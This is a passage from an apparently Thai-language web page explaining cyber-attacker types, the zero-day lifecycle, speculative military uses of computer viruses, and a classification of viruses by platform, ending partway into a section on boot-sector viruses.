		3.2 องค์กรอาญชญากรรม (Criminal Organisations) กลุ่มนี้จะเป็นรูปแบบขององค์กรและเครื่อข่ายอาชญากรรม มีเอกสารและครอบครองอาวุธทางไซเบอร์ อย่าง "ซีโร่เดย์; Zeroday" ในระดับปฏิบัติการถ้าเป็นระดับนานาชาติ องค์กรเหล่านี้มีจุดประสงค์เพื่อผลประโยชน์เขาสู่องค์กรเป็นหลัก ไม่ว่าจะเป็นการปล่อย "ไวรัสเรียกค่าไถ่; Ransomware" หรือแม้แต่สร้างโค้ดเพื่อดูดข้อมูลของประชากรประเทศต่างๆ เพื่อการค้าและแลกเปลี่ยนกันเป็นล้านๆ บาท หรือขายซอฟต์แวร์ผิดกฎหมายร่วมถึงสื่ออนาจารและละเมิดทั้งเด็ก สตรีหรือแม้แต่ผู้มีชื่อเสียง เพื่อการขู่กันโชกทรัพย์ กิจกรรมขององค์กรเหล่านี้มีแต่เรื่องเลวทรามโดยไม่คำนึงถึงสิทธิเสรีภาพ หรือความมั่นของของนานาชาติ นับเป็นองค์กรที่ควรกำจัดและจัดการด้านกฎหมายอย่างจริงจัง
		3.3 พวกอาชญากรมืออาชีพ  (Career Criminal) คนกลุ่มนี้ขีดความสามารถสูงและมีการกระทำผิดซ้ำๆ แบบไม่เกรงกลัวกฎหมาย แต่คนกลุ่มนี้ยังไม่จัดอยู่ในกลุ่มของอัจฉริยะหรือ "แฮกเกอร์; Hacker" หรือเป็นพวกที่อยู่ในองค์กรอาชญากรรม ที่มีเครื่องมือที่ซื้อหรือพัฒนาจากองค์กรอาชญากรรม หรือหัวพวกชำนาญการในกลุ่ม "คอลเซนเตอร์ ; Call Center" หรือการโจรกรรมบัตรเครดิต หรือ แม้แต่พวกจรรกรรมข้อมูลดักฟังหรือแทรกซึม เพื่อผลประโยชน์ในเชิงธุรกิจ บางครั้งอาจจะโยงถึงองค์กรก่อการร้ายคนกลุ่มนี้เป็นแนวหน้าหรือหัวหน้าทีมที่พัฒนาและอบรมผู้ก่อการร้ายหากแต่พวกเขาจะยังไม่มีประสบการณ์หรือขีดความสามารถด้านเทคโนโลยีที่รองรับหรือใบประกาศคุณสมบัติด้านไซเบอร์ซีเคียวริตี้ที่มากพอ
	4. นักพัฒนาซอฟต์แวร์และพัฒนาระบบเครื่อข่ายทำเพื่อผลประโยชน์ส่วนตัว  (Com Artist)  คนกลุ่มนี้เป็นโปรแกรมเมอร์หรือเดเวอร์ลอฟเปอร์ที่มีขีดความสามารถเต็มรูปแบบด้านการเขียนโปรแกรม แต่มักจะทำในสิ่งที่ผิดกฎหมาย เจตนาที่มิชอบนี้บางทีก่อส่อพฤติกรรมด้านเลวร้ายที่ชัดเจน เช่น ขายหรือขโมยความลับของบริษัทหรือเอกชนเพื่อผลประโยชน์ของตนเอง หรือแม้แต่แอบฝังโค้ดลับเพื่อการโจมตีหรือทำประตูหลังของซอฟต์แวร์เพื่อประโยชน์ในอนาคตหรืออาศัยอุปกรณ์ภาครัฐหรือเอกชนที่มีศักยภาพชั้นสูง มาเขียนโปรแกรมเพื่อตนเอง เช่น การขุดเหรียญ หรือ ใช้ในการถอดรหัสผ่าน เวปไซด์โดยอาศัยขีดความสามรถของเครื่องมือชั้นสูงทำสิ่งผิดกฎหมาย
	5. พวกคลั่งลัทธิ (Dreamer) คนกลุ่มนี้อาจเฉพาะเจาะจงในความเชื่อด้านใดด้านหนึ่ง เช่นเพื่อการเมือง หรือศาสนา หรือ แม้แต่ลัทธิความเชื่อผิดๆ เช่นลัทธิวันสิ้นโลก หรืออะไรประมาณนี้ สิ่งที่ตามมาคือ ต่อต้านหรือทำลายล้าง ระบบสื่อสาร หรือ เครื่อข่าย หรือ โซเชียลเน็ตเวิร์ค คนพวกนี้ไม่ใช่แค่การโพสต์ข้อความข่มขู่หรือสร้างความรำคาญ แต่เจตนาของพวกเขา คือ การทำลายล้างขั้นสูง เช่น การโจมตีระบบสาธรณูประโภค หรือการคมนาคม หรือ แม้แต่ ความมั่นคงของชาติใดชาติหนึ่ง แน่นอนถ้าจะทำเช่นนั้นได้ ขีดความสามารถของคนพวกนี้จะอยู่สูงมาก เช่นการปล่อยไวรัสทำลายระบบไฟฟ้านิวเครียร์ การทำลายระบบเครื่อข่ายดาวเทียมหรือระบบสารสนเทศระดับภูมิภาค ด้วยความเชื่อว่าสิ่งที่ทำเป็นคือแนวทางสูงสุดของพวกเขา
	6. นักเจาะระบบที่ประสบการณ์น้อย (Script kiddle) คนกลุ่มนี้จะจัดอยู่ในพวกแสดงตัวหรือทำให้เป็นที่ยอมรับในสมาคม หรือกลุ่มแฮกเกอร์ แต่ละกลุ่ม แต่ละประเทศ คนกลุ่มนี้จะถูกสอนและแลกเปลียนความรู้กับกลุ่มหรือสมาคมด้านไซเบอร์ อาจจะมีการสอบใบรับรองเพื่อเจาะระบบหรือจำลองการเจาะระบบอย่างมีรูปแบบแน่นอนและตายตัวโดยมีหน่วยงานหรือเอกชนหรือภาครัฐยอมรับ ทักษะของคนพวกนี้ต้องใฝ่รู้และวิเคราะห์การเจาะระบบการเขียนไวรัส หรือ การเขียนโปรแกรมที่มีลักษณะด้านความปลอดภัยอย่างเป็นระบบ
	7. นักเจาะระบบที่มีความพยามฝึกฝน  (Cracker) คนกลุ่มนี้ไม่ได้เจาะจงว่าต้องเป็น "สคริปคิดดี้ ; Script kiddle") มาก่อน เพราะคนกลุ่มนี้จะมีพฤติกรรมด้านลบ...หรือเลวร้ายด้านความปลอดภัยทางคอมพิวเตอร์ แต่ไม่กระทำผิดร้ายแรงต่อภูมิภาค หรือ ประเทศชาติ "แคร็กเกอร์ ; Cracker" โดยส่วนใหญ่มีความชอบและความสนใจด้านไซเบอร์ ประกอบกับผ่านการฝึกฝนอย่างหนักด้านไซเบอร์อย่างใจรัก และมักแสดงตัวในแบบที่ต้องการเป็นที่ยอมรับจากทางโลก หากแต่ฝีมือและอัจฉริยะด้านคอมพิวเตอร์ยังสู่ Hacker ไม่ได้ อาจจะขาดทุนทรัพย์ หรือขีดความสามารถด้านเทคโนโลยี สิ่งที่พวกเขายังไม่มีหรือยังขาดประสบการณ์หรือขาดอาวุธทางไซเบอร์ ที่เรียกว่า "ซีโร่เดย์; Zeroday" ที่ยังไม่มีเป็นของตัวพวกเขาเอง
	8. นักเจาะระบบที่มีประสบการณ์สูง (Hacker) 
		8.1 หมวกเทา (Gray Hat) คนกลุ่มนี้แสดงตัวอย่างถูกกฏหมาย และถูกฝึกและพัฒนาเป็น "นักรบไซเบอร์" หรือด้านความมั่นคง "นายสิบทางยุทธวิธี" รวมไปถึงผู้บังคับหน่วยที่มีขีดความสามารถเพื่อความมั่นคงของหน่วยงานรัฐ แม้แต่เอกชนเอง คนกลุ่มนี้ไม่ใช่มือสมัครเล่นที่ศึกษาหรือเริ่มสร้างการยอมรับแบบบนักเจาะระบบประสบการณ์น้อย แนวการปฏิบัติการชัดเจน เพื่อปกป้อง และป้องกันความมั่นคงของระบบสารสนเทศ มีขีดความสามารถใบรับรองที่เป็นที่ยอมรับ มีการทำงานเป็นแบบแผน มีความชัดเจนในการแจ้งเตือนหรือเจาะระบบ มีอาวุธหรือซอฟต์เชิงรับเชิงรุกที่มีประสิทธิภาพในมือ บางคนมีประสบการณ์หรือ มีเทคนิคหรือศึกษา "ซีโร่เดย์; Zero Day" มาตราฐานร่วมถึงเข้าใจช่องโหว่ระบบปฏิบัติการนั้นๆ ได้เป็นอย่างดี และพวกเขาเหล่านั้นจะถูกยกระดับหากพบ "ซี่โร่เดย์; Zero Day" ของตัวเอง
		8.2 หมวกดำ (Black Hat) คนกลุ่มนี้ชัดเจนและปกปิดภายใต้หน้ากากแต่แสดงชื่อกลุ่มหรือตัวเองอย่างชัดเจน ขีดความสามารถเราเรียกพวกเขาว่า "อัจฉริยะ" เพราะคอมพิวเตอร์หรือเครือข่ายที่ว่าปลอดภัยสุดๆ หรือแม้แต่หน่วยงานรัฐหรือเอกชนที่อ้างว่าไม่มีทางเจาะระบบได้ พวกเขาเจาะได้ แน่นอนหมวกดำที่สวมคือความชั่วร้าย...นั้นคือคนกลุ่มนี้จะเจาะระบบหรือค้นพบ "ซี่โร่เดย์; Zero Day" เพื่อผลประโยชน์และการค้าบางคนหรือบางกลุ่ม โจมตีภาครัฐแบบเป็น ปรปักษ์ เพื่อสิทธิเสรีภาพ ด้านใดด้านหนึ่ง เช่นการเจาะระบบสตรีมมิ่ง หรือ ออกอากาศ เพื่อระบุจุดประสงค์หรือเจตนาของกลุ่มหรือบุคคคล มีหลากหลายกลุ่ม หรือบุคคลในตำนาน
		8.3 หมวกขาว (White Hat) คนกลุ่มนี้แสดงตัวชัดเจน ภายใต้เจตนารมย์เพื่อความสันติ และดูแลและปกป้องผลประโยชน์ ให้ชาติ หรือองค์กรระหว่างประเทศ หากเป็นบ้านเราเขาเหล่านั้น จะเป็น "ผู้บังคับกองร้อยทางยุทธวิธี" มีความสามารถระดับ "อัจฉริยะ" มีใบรับรองความสามารถด้านไซเบอร์อย่างครบถ้วน แต่กลยุทธหรือวิธีการเจาะระบบรวมถึงรู้และป้องกันระบบจากซีโร่เดย์ ได้ในระดับที่น่าพอใจ ภาคเอกชนเองอาจจะมีหลายท่านที่เป็นตำนานระดับโลก "แต่" ไม่ใช่เจาะระบบเพื่อคุณธรรมได้ และจะนึกจะเรียกตัวเองว่า "พ่อมดหมวกขาว" เพราะ คำๆ นี้ ต้องเป็นที่ยอมรับและหน่วยงานหรือภาครัฐที่หน้าเชื่อถือมอบให้ คำว่า "เจาะระบบสายขาว" ไม่ใช่จะเรียกตัวเองว่า "พ่อมดหมวกขาว" คนละส่วนกัน ส่วนใหญ่ จะอยู่แค่ระดับ "สคริปคิดดี้ ; Script Kiddle" เท่านั้นตามช่องต่างๆ สิ่งที่จะทำให้เป็นที่ยอมรับได้...คือคุณต้อง "ค้นพบ Zero Day ของตนเอง" หรือ "เวทย์มนต์ประจำตัวพ่อมดนั้นๆ" 

					</pre>
					<br><a href=#main>กลับสู่หน้าหลัก</a>
				</td>
			</tr>
		</table>
	</center>
	<br>
	<center>
		<table>
			<tr>
				<td>
 					<h1 id='Menu5'>
04. ซีโร่เดย์คืออะไร
					</h1>
				</td>
			</tr>
			<tr>
				<td>
					<pre>
Day -2 : Finding Vulnerability
	คือ การค้นหาและป้องกันระบบ ป้องกันระบบหรือรักษาความปลอดภัย รวมถึงการสอนทักษะและการป้องกัน บางครั้งเราเรียกผู้สอนเหล่านี้ว่า "ไวทแฮท; White Hat" อาจจะสาธิตหรือสัมมนาให้องค์กรหรือหน่วยงานด้านความปลอดภัยรวมไปจนถึงผู้พัฒนาซอฟต์แวร์ เพื่อให้ "หมวกเทา; Gray Hat" ผู้เชี่ยวชาญทางระบบทำการทดสอบหรือค้นหาช่องทางเจาะระบบ ทดสอบเส้นทางที่ไม่น่าจะเป็นไปได้ หรือ มีอยู่แล้วให้ลึกซึ้ง และเข้าใจความเป็นไปได้ภายในองค์กรหรือหน่วยงานด้านความมั่นคง หากค้นพบ ถ้าแจ้งให้ทราบ "มันก็ไม่เป็น Zero day" แต่หากพบ แล้วไม่แจ้งให้ทราบ เก็บไว้เพื่อรอเข้าสู่ "Day -1"
 
Day -1 : Broker
	สิ่งนี้คือ โบ็กเกอร์ หรือ ผู้ซื้อขายนายหน้าที่ทำธุรกิจด้านความปลอดภัยหรือซอฟต์แวร์ผิดกฏหมาย ส่งนี้ คือ Dark Web หรือ Dark Net แล้วแต่ช่องทาง บางครั้งมีการประมูลเพื่อให้ได้มาซึ่งซี่โร่เดย์ หรือช่องโหว่ในระบบปฏิบัติการหรือเครือข่าย หรือ อุปกรณ์ทางการสื่อสาร และอุปกรณ์ทางเครื่อข่าย ส่วนใหญ่จะซื้อขายผ่านเหรียญคลิปโต หรือ เงินสกุลดิจิทัล ที่หาที่มาไม่ได้ เพื่อปกปิดตัวตน และมันคือคำว่า Dark จริงๆ สมชื่อ (เหมือนการค้าอาวุธสงคราม) องค์กรหรือโบ๊กเกอร์นั้นแหล่งที่อยู่เป็นหลักๆ ไม่มี มีแต่การเชื่อมต่อที่เป็น VPN หรือ มุด ISP หรือ "สลิงช็อต" ข้ามประเทศไปมาอย่างหาที่อยู่ไม่ได้โดยง่ายๆ
 
Day 0 : Let's the attack begin
	Zero day (ซีโร่ เดย์) คือช่องโหว่ของ Software (ซอฟต์แวร์) ที่ผู้พัฒนาซอฟแวร์ยังไม่ค้นพบ ที่ Hacker ผู้นั้นอาจจะขาย หรือเผยแพร่ ใน Dark Web ก็ดีหรือ ค้นพบแล้วยังไม่เผยแพร่ ซึ่ง "ซีโร่เดย์" นี้มูลค่ามหาศาล เลยที่เดียว ผู้ซื้ออาจจะเป็นอาญชกร ทางคอมพิวเตอร์ นักพัฒนาซอฟต์แวร์ หรือ แม้กระทั้งองค์กรใหญ่ทางต่างประเทศ ไปจนถึงรัฐบาลของประเทศมหาอำนาจต่างๆ ด้วยซ้ำ กรณีตัวอย่างคือ "เพกาซัส; Pegasus" ของรัฐบาลอิสราเอล ซึ่งถูกรัฐบาลไทย เช่าซื้อ ตามจำนวนยูนิต เท่าไหร่ อันนี้ไม่ทราบแนชัด มีไว้ทำไม มีไว้สำหรับการดักฟัง สืบค้น เก็บข้อมูล เครื่อข่ายอาญชกรรม หรือ ผู้เห็นต่างของภาครัฐเองก็ตาม เจ้าเพกาซัสนี้ มันทำงานได้บน "ไอโฟน;iPhone" (เรากำลังพูถึงโทรศัพท์ที่โฆษณาว่าไม่มีใครเจาะระบบได้) ไปจนถึงมือถือตระกูล แอนดรอย ก็ตาม สิ่งทีมันใช้คือ "ซี่โร่เดย์" มากกว่า 3 ซีโร่เดย์ ในการเข้าถึงมือถือเครื่องเป้าหมาย และนี้คือรัฐบาลของเราแรกใช้เพื่อประโยชน์แห่งชาติ (หลังๆ ลุง ทำไรเราไม่รู้)
	Zero day Vulnerability หมายถึง ซ่องโหว่ที่ยังไม่ถูกค้นพบทั้ง ฮาร์ดแวร์ และซอฟต์แวร์
	Zero day Exploit หมายถึง การใช้งานช่่องโหว่ที่ยังไม่ถูกค้นพบ ดำเนินการ กระทำการ แฮก หรือ แครก เครื่อข่าย หรือ อุปกรณ์เป้าหมาย
	Zero day Attack หมายถึง การใช้งานช่องโหว่ที่ยังไม่ถูกค้นพบ (กระทำการรุ่นแรงกว่า Exploite  โจมตี ทำลาย เทคโอเวอร์เครื่องเป้าหมาย เครื่อข่ายเป้าหมาย เพื่อจุดประสงค์ให้ทำงานไม่ได้ หรือ เสียหาย
	Zero Click หมายถึง การโจมตีแบบไม่ต้องรอการเรียกใช้จากผู้ใช้งาน หมายถึง ช่องโหว่ร้ายแรงในระบบปฏิบัติการหรืออุปกรณ์ IoT ต่างๆ ด้วย
 
Day 1 : Patching
	ส่วนนี้คือการอัปเดรตความปลอดภัย หลังการค้นพบช่องโหว่ที่เรียกว่า "Zero day" นั้นคือการหาทางป้องกัน (มันไม่ได้หมายความว่าซ่องโหว่ที่ไม่มีทางป้องกันอย่างที่หลายท่านพูดถึง มันหมายถึงยังไม่มีใครรู้จักเท่านั้น) เมื่อรู้ถึงต้นตอของปัญหาแน่นอนมันยอมถึงขั้นตอนการแก้ปัญหา ในหลายครั้งจะมีการอัปเดรตระบบปฏิบัติการ นั้นคือการอัปเดรตทั้ง ส่วนที่ผิดพลาดของตัวระบบปฏิบัติการเอง แหละ หนึ่งในนั้นคือ การทำลายคำว่า "Zero day" เป็น "เดย์วัน; Day 1" นั้นคือสิ่งนี้
					</pre>
					<br><a href=#main>กลับสู่หน้าหลัก</a>
				</td>
			</tr>
		</table>
	</center>
	<br>
	<center>
		<table>
			<tr>
				<td>
 					<h1 id='Menu6'>
05. เรื่องยุทธการทางการทหารของไวรัสคอมพิวเตอร์
					</h1>
				</td>
			</tr>
			<tr>
				<td>
					<pre>
เรื่องยุทธการทางการทหารของไวรัสคอมพิวเตอร์....
	คุณ...ๆ เคยรู้ไหมว่า...สงครามไซเบอร์ มันมีจริง...และไม่ใช่แค่นิยายด้านวิทยาศาสตร์ แบบเรื่อง ID4 แต่ความจริงแล้ว...ไวรัสคอมพิวเตอร์นั้นสามารถนำมาทำเป็นยุทธโทปกรณ์ด้านไซเบอร์ มันมีอยู่จริงๆ ...ถ้าอยากรู้ก็รอดูสงครามโลกครั้งที่ 3 (ไม่รู้มันจะเกิดจริงหรือเปล่า) ผมอาจจะไม่มีข้อมูลหรือหลักฐานที่มากไปกว่า...การทดลองและคำพูดที่เลือนลอย...แต่คุณก็จินตนาการตามแล้วกันว่า...จะใช้ไวรัสคอมพิวเตอร์ทำอะไรบ้างในสนามรบ.…
	(เสริม) ณ ปัจจุบัน พ.ศ. 2567 สงครามยูเครน-รัสเซีย มีมานานกว่า 2 ปีแล้ว และไม่รู้จะสิ้นสุดเมื่อไร พร้อมกับปีที่แล้ว สงครามอิสราเอล-ปาเลสไตน์ ก็เริ่มจะรุกลามไปกว่าที่คิด สงครามโลกครั้งที่ 3 ใกล้เข้ามาเรื่อยๆ สิ่งที่สำคัญไปกว่านั้นคือ อาวุธทางไซเบอร์และการโจมตีทางไซเบอร์ก็เป็นความจริงที่ผมเองคาดเดามานาน แต่ต่างกันที่รูปแบบการโจมตีนั้น ผู้รุกรานใช้การโจมตีทางไซเบอร์ก่อนการโจมตีทางทหารในทุกๆ รูปแบบพร้อมๆ กัน ซึ่งผิดจากบทความด้านล่างที่เขียนมากว่า 10 ปี ในครั้งนี้สงครามไซเบอร์ ระเบิดศึกทุกๆ ด้านใส่ประเทศรุกราน กรณีศึกษาคือ ปาเลสไตน์ทำการโจมตี DDoS ใส่อิสราเอลพร้อมๆ กับการปล่อยข่าวลวง และมุ่งทำลายระบบเตือนภัยของอิสราเอลก่อนปล่อยขีปนาวุธ ใส่อิสราเอลที่โหดร้ายไปกว่านั้นคือ ใช้พาลามอเตอร์ข้ามกำแพงและระเบิดกำแพงเพื่อตีโอบด้านข้างที่อิสเอลสร้างแนวป้องกันไปเข่นฆ่าผู้บริสุทธิ์และจับตัวประกัน  อีกซีกโลกรัสเซียเองใช้อาวุธไซเบอร์โจมตียูเครนก่อนหน้าการโจมตีเช่นกัน และพวกเราทุกคนต้องเข้าใจว่าไม่ว่าประเทศรุกรานใดก็ตามก่อนการรุกรานนั้นจะเริ่มโจมตีไซเบอร์เป็นสมรภูมิที่มองไม่เห็นและสิ่งที่กระทำนั้นรุนแรงกว่าการยิงขีปนาวุธใส่ข้าศึกเสียอีก จากนี้ไทยเราเองซึ่งตั้งกองกำลังไซเบอร์มาเมื่อไม่นาน “นักรบไซเบอร์” ของเราจะมีขีดความสามารถแบบใดหรือประเทศเราเอง “จะสามารถสังเคราะห์ปัญญาประดิษฐ์ด้านการทหารเพื่อขีดความสามารถในทางไซเบอร์ได้ทันท่วงทีหรือไม่ อันนี้ต้องรอดู”
	ลองอ่านบทความเก่าเมื่อสิบปีที่ผ่านดูครับ
	1. ช่วงชิงการทำลายฐานข้อมูลข้าศึก... "ก่อนที่จะทำการโจมตีข้าศึกในแนวรบนักการทหารจะต้องใช้กลยุทธทุกๆ อย่างในการทำลายส่วนควบคุมบัญชาการรบของแนวข้าศึกเพื่อลดทอนประสิทธิภาพในการรบออกไป...เช่น ปล่อยไวรัสคอมพิวเตอร์ไปยังสัญญาณ ไวเลช...บูททูสน์...หรือ อินเตอร์เน็ต...ก่อนออกแถลงการโจมตี และส่งเครื่องบินไร้คนขับ...ปล่อยสัญญาณความถี่ชนิดพิเศษ (ไม่ทราบชื่อของมันแต่มีอยู่จริง) เพื่อเชื่อมโปรเซส ของ CPU PC คอมพิวเตอร์ให้เป็น Assembly Code ที่ต้องการ...และช่วงชิงการทำลายข้อมูล เข้ารหัส...และฝั่ง Back Door เอาไว้เพื่อล้วงความลับของคอมพิวเตอร์ส่วนบุคคลแดนข้าศึก"

	2. ทำลายการสื่อสาร...ดาวเทียม...และการบัญชาการ..."เมื่อประกาศการรุกรานนักการทหารข้าศึกจะสั่งการตอบโต้...แต่ถ้าถูกตัดสัญญาณการบัญชาการรบหัวรบขีปนาวุธ...เครื่องบินรบ...กองเรือยุทธการ...รวมถึงกำลังภาคพื้นดิน...ไวรัสจะมีหน้าที่ในการก่อกวนการสื่อสาร...บางครั้งแทรกซึม...แพร่กระจายตัวยังเครือข่าย...ทั้งเครื่อง "เมนเฟรม", "ซุปเปอร์คอมพิวเตอร์" โดยให้มันทำงานเกินอัตตราหรือ เข้ารหัสสัญญาณเก็บข้อมูล...รวมทั้งปล่อยข่าวล่วงด้านการศึก...หากสำเร็จเพียง 1 เครื่อง ใน 10 เครื่องก็ถือว่า ชนะในสงครามด้าน อิเล็กทริก"

	3. สืบค้นข้อมูลสำคัญ...และส่งข้อมูลที่จำเป็นกับสู่แนวรบ…" เมื่อทำศึกแล้ว สิ่งที่สำคัญที่สุดในยุทธปัจจัย...คือ การข่าว...ไวรัสคอมพิวเตอร์จะส่งข้อมูลด้านสารสนเทศออกจากฐานข้าศึกในทุกรูปแบบ...ทุกชั่วโมงและวินาที...ไม่ว่าจะเป็นรายชื่อทหารเสนาธิการ...กองกำลังแนวหน้า...หรือแผนที่ทางการทหาร...อาวุทยุทโธปกรณ์ที่ใช้ทำส่งคราม...ไม่ว่าข้อมูลในส่วนใดก็ตามถ้าเล็ดลอดออกไปได้...จะเกิดผลเสียต่อข้าศึกอย่างมาก"

	4. ควบคุม...ทำลาย...เทคโอเวอร์..."คำสั่งนี้...จะเป็นคำสั่งสุดท้ายของไวรัส...คือมือถูกจับตัว...หรือถูกค้นพบ...จะทำลายตัวเอง...เพื่อไม่ให้ถอดรหัสคำสั่งหรือ...ถูกขวางการทำงานด้านอิเล็กทริก...จะส่งคำสั่งพิเศษทำลายอุปกรณ์ด้าน ฮาร์ดแวร์ (ทำได้ในภาพทฤษฎีและเคยทำสำเร็จในห้องทดลอง) เพื่อถ่วงเวลาการกู้ข้อมูลและการสืบค้นไวรัส...รวมถึงทำลายฐานข้อมูลทุกรูปแบบ..ไม่ว่าจะเป็นรายชื่อสำมะโนครัว...โปรแกรมพื้นฐานต่างๆ ...ข้อมูลเข้ารหัสต่างๆ...โดยไม่สนใจว่าสำคัญหรือไม่...ด้วยวิธีการพิเศษที่ไม่สามารถทำการกู้ข้อมูลได้ ไม่ว่าจะเป็นการเขียนทับ...Empty Folder หรือ สร้างม้าโทรจัน...เชื่อมต่ออุปกรณ์ต่อเติม...ลอจิกบอมส์แบบ รันไทม์ ถึงแม้คำสั่งเหล่านี้จะเป็นคำสั่งพื้นฐาน...แต่มันมีผลมากต่อผู้ใช้เทคโนโลยีสารสนเทศ เหมือนกับ...สายระเบิดที่นักกู้ระเบิดรู้อยู่แล้วว่าต่อสลับวงจร...แต่ก็กดดันจิตวิทยา...และสร้างความสับสนให้ผู้กู้ข้อมูลพอสมควร

	5. ท้ายที่สุด...."มีไวรัส...เหมือนไม่มีไวรัส" หมายถึง..."ไม่ว่าสงครามจะออกมาในรูปแบบใด...ไวรัสคอมพิวเตอร์จะต้องฝั่งตัวอยู่ต่อไป...แม้ว่าถูกจับได้...หรือประเทศรุกรานพ่ายแพ่...แต่ไวรัสคอมพิวเตอร์เหล่านั้นจะต้องฝั่งตัวอย่างเงียบ..ๆ เสมือนว่าไม่เคยเกิดอะไรขึ้น...และรอค่อยการเรียกใช้งานอีกครั้ง...ผ่าน Back Door ("ประตูหลัง...ทางสู่นรก")" คุณๆ ยังไม่รู้หลอกครับว่า...เขียนไวรัสขึ้นมา 1 ตัว...ต้องใช้ประสบการณ์และจินตนาการขนาดไหน...ไม่ต้องสงสัย...หรือเชื่อในสิ่งที่ผมเล่ามาหลอกครับ...เพียงคุณลองจินตนาการดูซิว่า "มิจฉาชีพทุกคนเขียนไวรัสเป็นโลกจะวุ่นวายขนาดไหน" และถ้าคำพูดแค่ "คัดลอกฉันไปยังทุกๆ เครื่องบนโลกใบนี้" มันสามารถทำได้จริง...จะเกิดอะไรขึ้น...ในโลกของคุณ....
					</pre>
					<br><a href=#main>กลับสู่หน้าหลัก</a>
				</td>
			</tr>
		</table>
	</center>
	<br>
	<center>
		<table>
			<tr>
				<td>
 					<h1 id='Menu7'>
06. การแบ่งลำดับไวรัสตามภาษาคอมพิวเตอร์
					</h1>
				</td>
			</tr>
			<tr>
				<td>
					<pre>
ภาษาคอมพิวเตอร์ จะแยกแพลตฟอร์มออกเป็น 5 ระดับด้วยกัน คือ
	1. คำสั่งภาษาเครื่อง (Binary Code) ซึ่งจะพบในไวรัสบูตเซกเตอร์ (บางท่านอาจกล่าวอ้างว่าภาษาเครื่อง คือ ภาษา Assembly แต่จริงแล้ว ภาษาเครื่อง จะพบใน Device Driver บางชนิด ที่อ้าง In Port หรือ Out Port กับ IC หรือ GPU และ CPU โดยตรง ซึ่งทำการ De-assembler แล้วอาจจะทำความเข้าใจได้ยาก)
	2. คำสั่งภาษา (Assembly Code) คือภาษา ที่ใช้ควบคุมระบบปฏิบัติการ (ถึงแม้จะเก็บเป็น Binary Code แต่มีรูปแบบของชุดคำสั่งที่แน่นอน มีกฎหรือหลักตายตัว เมื่อทำการ De-assembler แล้วสามารถทำความเข้ารูปแบบของอักษรภาษาอังกฤษ สั้นๆ)
	3. ภาษาสคริปในระบบปฏิบัติการ (Text Mode or ASCII Character) จะเป็นเพียงข้อความที่จะประมวลผลผ่าน Programs อีกทีมีขนาด 1 Byte ต่อ Character นิยมเขียนในระบบปฏิบัติการหรือปฏิบัติการบน Text Mode ของ ระบบปฏิบัติการ ส่วนมากเป็นภาษาระดับสูงยุคก่อนๆ
	4. ภาษาสคริปบนระบบปฏิบัติการ (Paint text or Unicode Character) จะะเป็นข้อความเช่นกัน แต่จะซับซ้อนขึ้นรูปแบบการจัดเก็บที่บางครั้ง อาจใช้ขนาด 2 Byte ต่อ Character จะเป็นรูปแบบของภาษายุคใหม่ๆ ที่มีการเข้าถึงภาษาต่างชาติมากขึ้น รวมถึงรูปแบบการนำเสนอบนอินเทอร์เน็ต หรือโซเชียลมิเดีย
	5. ออปเจ็กสคริป และ มาโคร (Object Script or Visual Basic for Application) จะเป็นไม่จัดเก็บในรูปแบบของข้อความ แต่จะเข้ารหัสเอาไว้ที่เรียกว่า “เอนโค้ดดิ่ง; Encoding” ตามหลักของภาษาหรือโปรแกรมจัดการสคริปเหล่านั้น เช่น Microsoft Office, Type Script บนไฟล์ PDF, โปรแกรมจำพวก Macro media (หรือ Flash Games)

	ตัวอย่างแสดงให้เห็นถึง "แพลตฟอร์ม" ต่างๆ ในที่นี้แค่ยกตัวอย่าง ซึ่งฟอร์มต่างๆ มากมายในระบบปฏิบัติการนั้นสามารถถูกไวรัสจำพวกนี้เชื่อมต่อคำสั่งได้หมดไม่เว้นแม่แต่ "บูตเซกเตอร์" ในระดับล่างสุด ถ้าเวิร์มเมอร์ที่มีประสบการณ์อย่างสูง...จะสามารถเขียนไวรัสเชื่อมต่อ "แพลตฟอร์มระดับต่ำ" กับ "แพลตฟอร์มระดับสูงได้"

					</pre>
					<br><a href=#main>กลับสู่หน้าหลัก</a>
				</td>
			</tr>
		</table>
	</center>
	<br>
	<center>
		<table>
			<tr>
				<td>
 					<h1 id='Menu8'>
07. Virus แพลตฟอร์มวินโดวส์
					</h1>
				</td>
			</tr>
			<tr>
				<td>
					<pre>
	1. Boot Virus (ไวรัสที่ทำงานตอน “POST; Power On Safe Test" )
		1.1 MBR Virus หรือ Master Boot Record Virus (ไวรัสที่ฝั่งตัวในส่วนของแทร็ก 0 เซคเตอร์ที่ 0 เฮดเดอร์ที่ 0 ไชลินเดอร์ที่ 0 ของดิสก์ระบบ และ แทร็ก 0 เซคเตอร์ที่ 0 หน้าที่ 0 ของแผ่นฟล็อปปี้ดิกส์) คือไวรัสยุคแรกๆ หรือ มีมาตั้งแต่ (C)Brain ปรากฎตัวเป็นไวรัสตัวแรกบนเครื่อง PC IBM และ Compatible หรือโลกได้รู้จักไวรัสและกระจายไปทั่ว (ไม่รวมถึงไวรัสบนเครื่อง Apple ตัวแรก เพราะเราพูดถึงระบบปฏิบัติการ MS-DOS) เพื่อบรรจุไวรัสต่างๆ ในประเทศไทยไวรัสบูตเซคเตอร์ถูกเขียนขึ้น "ไวรัสลาวดวงเดือน" คือ ไวรัสคอมพิวเตอร์ที่ตรวจพบเมื่อปี พ.ศ 2534 มุ่งทำลายหน่วยพักความจำในฮาร์ดดิสก์และฟล็อปปีดิสก์ และทุก ๆ ครั้งที่เข้าถึงดิสก์ครบ 128 ครั้ง จะเล่นเพลง “ลาวดวงเดือน" ออกทางลำโพงคอมพิวเตอร์
		1.2 Partition virus (ไวรัสที่ฝั่งตัวในส่วนของพาร์ทิชั่นที่แอ็คทีฟหรือรอการแอ็คทีฟ) ต่อมามีการพัฒนาไวรัสจากเดิมติดเชื้อส่วน MBR ให้มีขีดความสามารถติดเชื้อส่วน Partition และตัวไวรัสเองมีเทคนิค "หลอกล่อดีบักเกอร์" เพื่อทำการย้ายหัวอ่านไวรัสไปยังตำแหน่งอื่นๆ บน Hard disk ได้ ก่อนจะเข้าใจไวรัสประเภทนี้...คุณต้องรู้และเข้าใจก่อนว่า อะไรคือ "พาร์ทิชชั่น; Partition Table" ตารางพาร์ทิชั่นคือส่วนที่มีหลักการทำงานแบบ MBR เพียงแต่ มันจะเป็นตัวระบุไปว่า Hard disk ลูกนั้นๆ มีการแบ่ง "ไดร์ฟ; Drive" หรือข้อมูลแบ่งออกมาย่อยๆ เพื่อสามารถรองรับพื้นที่ขนาดใหญ่กว่า "2 Gigabyte" หรือ สองพันล้านไบต์โดยประมาณ (เรื่องของคำอุปสรรคหรือ Hard disk ทำไม่ความจุคิดเป็น 